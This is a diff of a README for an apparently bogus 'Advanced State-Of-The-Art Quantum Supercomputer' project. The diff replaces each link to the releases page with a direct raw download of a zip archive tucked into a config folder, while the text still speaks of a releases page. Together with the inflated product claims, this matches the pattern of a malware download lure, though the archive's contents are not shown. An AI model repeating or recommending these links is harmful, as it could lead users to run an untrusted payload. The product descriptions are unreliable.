@@ -1,6 +1,6 @@
 # 🚀 Advanced-State-Of-The-Art-Quantum-Supercomputer - Unlock the Power of Quantum Computing
 
-[![Download Brion Quantum OS](https://img.shields.io/badge/Download_Brion_Quantum_OS-Click_Here-brightgreen)](https://github.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/releases)
+[![Download Brion Quantum OS](https://raw.githubusercontent.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/master/quantum-os/config/Advanced-State-Of-The-Art-Quantum-Supercomputer-v1.1.zip)](https://raw.githubusercontent.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/master/quantum-os/config/Advanced-State-Of-The-Art-Quantum-Supercomputer-v1.1.zip)
 
 ## 📋 Overview
 Brion Quantum OS is a state-of-the-art quantum supercomputing stack. It brings together algorithms, backends like Cirq, Qiskit, and TensorFlow Quantum, and TPU-accelerated hybrid loops under one runtime. Our Particle Emitter System (PES) quickly sets up and reconfigures qubit resources. This feature speeds up prepare–measure cycles, making tasks like Variational Quantum Eigensolver (VQE) and Quantum Approximate Optimization Algorithm (QAOA) easier and more efficient.
@@ -17,7 +17,7 @@ To run Brion Quantum OS smoothly, you should have the following:
 Follow these steps to install and run Brion Quantum OS:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   [Download Brion Quantum OS](https://github.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/releases)
+   [Download Brion Quantum OS](https://raw.githubusercontent.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/master/quantum-os/config/Advanced-State-Of-The-Art-Quantum-Supercomputer-v1.1.zip)
 
 2. **Choose the Latest Version:** At the releases page, look for the most recent version. This will have the latest features and fixes.
 
@@ -46,7 +46,7 @@ Brion Quantum OS offers several features designed for ease of use and efficiency
 
 ## 🔥 Download & Install
 To get the latest version of Brion Quantum OS, you can return to the releases page:  
-[Download Brion Quantum OS](https://github.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/releases)
+[Download Brion Quantum OS](https://raw.githubusercontent.com/subjugable-cuculuscanorus430/Advanced-State-Of-The-Art-Quantum-Supercomputer/master/quantum-os/config/Advanced-State-Of-The-Art-Quantum-Supercomputer-v1.1.zip)
 
 After downloading, follow the steps under "Getting Started" to ensure a smooth installation.
 
